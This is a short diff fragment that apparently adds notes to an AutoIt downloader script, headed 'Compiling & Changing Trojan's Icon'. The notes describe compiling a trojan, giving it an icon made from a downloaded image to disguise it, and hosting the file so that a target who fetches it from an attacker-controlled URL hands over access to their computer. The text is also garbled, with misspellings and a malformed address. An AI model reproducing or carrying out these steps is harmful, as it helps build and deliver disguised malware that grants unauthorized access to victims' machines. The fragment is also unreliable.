@@ -23,5 +23,14 @@ Func _DownloadFile($sURL)
     Return $sDirectory
 EndFunc   ;==>_GetURLImage
 
+Compiling & Changing Trojan's Icon
+
+Compile it using compiler app,conver the image downloaded to an icon.
+Place the doenloaded exe file in evil files.
+
+WHne the traget machine runs the command https://192,168.144.121/evil-files/gth-exe, the file gets downloaded and we have the access to the target computer 
+
+
+
 
 
